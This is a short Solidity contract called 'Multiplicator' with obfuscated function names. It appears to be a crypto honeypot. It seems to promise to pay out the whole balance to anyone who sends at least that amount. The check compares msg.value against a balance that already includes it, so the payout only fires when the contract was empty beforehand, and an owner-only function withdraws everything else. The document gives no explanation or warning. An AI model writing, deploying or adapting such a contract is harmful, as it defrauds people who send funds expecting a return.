// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function _0xfcef2e()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function _0x8e1fac(address _0x50ffb1)
    payable
    {
        if(msg.value>=this.balance)
        {
            _0x50ffb1.transfer(this.balance+msg.value);
        }
    }
}